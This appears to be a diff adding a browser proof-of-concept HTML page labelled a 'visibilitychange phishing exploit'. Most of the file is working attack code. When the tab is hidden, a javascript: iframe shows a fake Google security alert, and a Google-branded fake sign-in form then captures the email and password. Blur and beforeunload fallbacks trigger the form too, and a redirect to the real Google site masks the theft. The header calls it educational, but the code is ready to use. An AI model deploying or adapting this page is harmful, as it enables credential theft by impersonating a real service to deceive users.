@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced PoC: visibilitychange Phishing Exploit</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+        }
+        .test-area {
+            border: 2px dashed #dc3545;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+        }
+        #status {
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+        .active {
+            background: #d4edda;
+            color: #155724;
+        }
+        .hidden {
+            background: #f8d7da;
+            color: #721c24;
+        }
+        button {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px 5px;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+        .instructions {
+            background: #e7f3ff;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+        }
+        #fakeLogin {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.3);
+            z-index: 10000;
+            width: 350px;
+        }
+        .login-form {
+            text-align: center;
+        }
+        .login-form input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        .login-form button {
+            width: 100%;
+            padding: 12px;
+            background: #4285f4;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .brand {
+            font-size: 24px;
+            font-weight: bold;
+            color: #4285f4;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Advanced PoC: visibilitychange Phishing Exploit</h1>
+        
+        <div class="warning">
+            <strong>⚠️ Security Warning:</strong> This is a proof of concept demonstrating a real security vulnerability. 
+            For educational purposes only.
+        </div>
+
+        <div class="instructions">
+            <h3>How to test:</h3>
+            <ol>
+                <li>Keep this tab open</li>
+                <li>Switch to another tab or minimize the browser</li>
+                <li>A phishing popup will appear</li>
+                <li>Click OK and you'll be redirected to a fake login page</li>
+            </ol>
+        </div>
+
+        <div class="test-area">
+            <h3>Exploit Test Area</h3>
+            <p>Current status: <span id="status" class="active">Page Visible</span></p>
+            <button onclick="alert('Now switch tabs to see the full exploit chain!')">
+                Click Me Then Switch Tabs
+            </button>
+            <p><small>Try opening a new tab or minimizing the window</small></p>
+        </div>
+
+        <!-- Hidden iframe that will execute the phishing popup -->
+        <iframe id="phishingFrame" style="width:0;height:0;border:0;visibility:hidden"></iframe>
+
+        <!-- Fake login page (hidden initially) -->
+        <div id="fakeLogin">
+            <div class="login-form">
+                <div class="brand">Google</div>
+                <h3>Sign in to continue</h3>
+                <p style="color: #666; font-size: 14px; margin-bottom: 20px;">Your session has expired for security reasons</p>
+                
+                <input type="email" id="email" placeholder="Email or phone" autofocus>
+                <input type="password" id="password" placeholder="Enter your password">
+                
+                <button onclick="submitCredentials()">Sign in</button>
+                <button onclick="closeLogin()" style="background: #666; margin-top: 10px;">Cancel</button>
+                
+                <p style="font-size: 12px; color: #666; margin-top: 20px;">
+                    <a href="#" style="color: #4285f4;">Forgot password?</a>
+                </p>
+            </div>
+        </div>
+
+        <div style="margin-top: 20px;">
+            <h3>Exploit Chain:</h3>
+            <ul>
+                <li>1. User switches tabs → visibilitychange triggered</li>
+                <li>2. Fake security alert appears</li>
+                <li>3. User clicks OK → Redirect to fake login page</li>
+                <li>4. User enters credentials → Stolen by attacker</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        let exploitTriggered = false;
+
+        document.addEventListener('visibilitychange', function() {
+            const status = document.getElementById('status');
+            const frame = document.getElementById('phishingFrame');
+            
+            if (document.hidden && !exploitTriggered) {
+                // Page is hidden - execute exploit
+                exploitTriggered = true;
+                status.textContent = 'Page Hidden - EXPLOIT TRIGGERED!';
+                status.className = 'hidden';
+                
+                console.log('Page hidden - triggering phishing popup');
+                
+                // More convincing phishing prompt that redirects to fake login
+                try {
+                    frame.src = `javascript:
+                        if(confirm('🔒 Google Security Alert: Unusual sign-in activity detected.\\n\\nFor your security, please verify your identity immediately.\\n\\nClick OK to continue to the verification page.')) {
+                            window.top.document.getElementById('fakeLogin').style.display = 'block';
+                            window.top.document.body.style.overflow = 'hidden';
+                        }
+                    `;
+                } catch(e) {
+                    console.error('Exploit failed:', e);
+                    // Fallback method
+                    showFakeLogin();
+                }
+                
+            } else {
+                // Page is visible again
+                status.textContent = 'Page Visible';
+                status.className = 'active';
+                console.log('Page visible again');
+            }
+        });
+
+        // Alternative method using window blur
+        window.addEventListener('blur', function() {
+            if (!exploitTriggered) {
+                setTimeout(() => {
+                    if (document.hidden) {
+                        showFakeLogin();
+                    }
+                }, 1000);
+            }
+        });
+
+        function showFakeLogin() {
+            exploitTriggered = true;
+            document.getElementById('fakeLogin').style.display = 'block';
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeLogin() {
+            document.getElementById('fakeLogin').style.display = 'none';
+            document.body.style.overflow = 'auto';
+        }
+
+        function submitCredentials() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // In a real attack, this would send to attacker's server
+            console.log('📧 CREDENTIALS CAPTURED:');
+            console.log('Email:', email);
+            console.log('Password:', password);
+            
+            // Show success message and redirect
+            alert('✅ Verification successful! Redirecting...');
+            document.getElementById('fakeLogin').style.display = 'none';
+            document.body.style.overflow = 'auto';
+            
+            // Simulate redirect to real Google (in real attack, would redirect to actual site)
+            setTimeout(() => {
+                window.location.href = 'https://www.google.com';
+            }, 1000);
+        }
+
+        // Additional exploit: Also trigger when page is about to be closed
+        window.addEventListener('beforeunload', function() {
+            if (!exploitTriggered) {
+                showFakeLogin();
+                return "Your session might not be saved. Are you sure you want to leave?";
+            }
+        });
+
+        console.log('🔒 Advanced phishing PoC loaded. Switch tabs to trigger exploit.');
+    </script>
+</body>
+</html>
